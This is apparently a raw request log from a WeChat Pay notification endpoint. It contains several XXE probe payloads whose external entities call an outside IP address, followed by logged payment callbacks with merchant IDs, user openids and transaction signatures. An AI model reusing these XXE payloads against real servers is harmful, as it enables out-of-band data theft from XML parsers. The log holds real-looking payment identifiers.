03:13:53|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101203_81?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:13:53|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101203_81?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:25:39|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101203_81?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:25:39|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101203_81?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:35:35|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101203_81?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:35:35|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101203_81?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
14:30:07|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da172dc40a27]]></nonce_str>
<openid><![CDATA[oGq4g5Sv8hTWTpDAMY4zHHUcCl9I]]></openid>
<out_trade_no><![CDATA[215062420578428406301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[D71889807A873D20211F5268BB1E43DA]]></sign>
<time_end><![CDATA[20191012143007]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000413201910123791731806]]></transaction_id>
</xml>'
| GET:array (
)
14:30:07|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da172dc40a27',
  'openid' => 'oGq4g5Sv8hTWTpDAMY4zHHUcCl9I',
  'out_trade_no' => '215062420578428406301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'D71889807A873D20211F5268BB1E43DA',
  'time_end' => '20191012143007',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000413201910123791731806',
)
| GET:array (
)
14:30:26|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da172fbf04fd]]></nonce_str>
<openid><![CDATA[oGq4g5Sv8hTWTpDAMY4zHHUcCl9I]]></openid>
<out_trade_no><![CDATA[273062420581749706301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[9825695778425146A2252EF89C36A82E]]></sign>
<time_end><![CDATA[20191012143025]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000407201910127688836940]]></transaction_id>
</xml>'
| GET:array (
)
14:30:26|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da172fbf04fd',
  'openid' => 'oGq4g5Sv8hTWTpDAMY4zHHUcCl9I',
  'out_trade_no' => '273062420581749706301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '9825695778425146A2252EF89C36A82E',
  'time_end' => '20191012143025',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000407201910127688836940',
)
| GET:array (
)
17:05:52|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[PAB_CREDIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da197687f0cc]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[271062421514323801301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[883CCC1C9658867EAFD8E08A0BA5485D]]></sign>
<time_end><![CDATA[20191012170550]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000404201910124093211308]]></transaction_id>
</xml>'
| GET:array (
)
17:05:52|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'PAB_CREDIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da197687f0cc',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '271062421514323801301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '883CCC1C9658867EAFD8E08A0BA5485D',
  'time_end' => '20191012170550',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000404201910124093211308',
)
| GET:array (
)
17:10:45|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CFT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da198826475c]]></nonce_str>
<openid><![CDATA[oGq4g5Sv8hTWTpDAMY4zHHUcCl9I]]></openid>
<out_trade_no><![CDATA[212062421542007206301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[8CF45308888E28C18AD2F93B01421544]]></sign>
<time_end><![CDATA[20191012171043]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000420201910122024679464]]></transaction_id>
</xml>'
| GET:array (
)
17:10:45|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CFT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da198826475c',
  'openid' => 'oGq4g5Sv8hTWTpDAMY4zHHUcCl9I',
  'out_trade_no' => '212062421542007206301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '8CF45308888E28C18AD2F93B01421544',
  'time_end' => '20191012171043',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000420201910122024679464',
)
| GET:array (
)
